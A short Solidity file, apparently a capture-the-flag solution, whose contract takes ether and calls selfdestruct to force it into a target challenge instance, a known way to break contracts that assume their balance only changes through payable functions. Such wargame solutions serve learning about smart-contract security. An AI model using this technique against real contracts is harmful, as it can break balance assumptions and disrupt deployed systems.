// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Solution {
    // Call this function passing the address of your instance along with some (or a lot 😜) of ether
    function killMe(address payable instance) payable external {
        require(msg.value > 0, "Send some wei");
        selfdestruct(instance);
    }
}
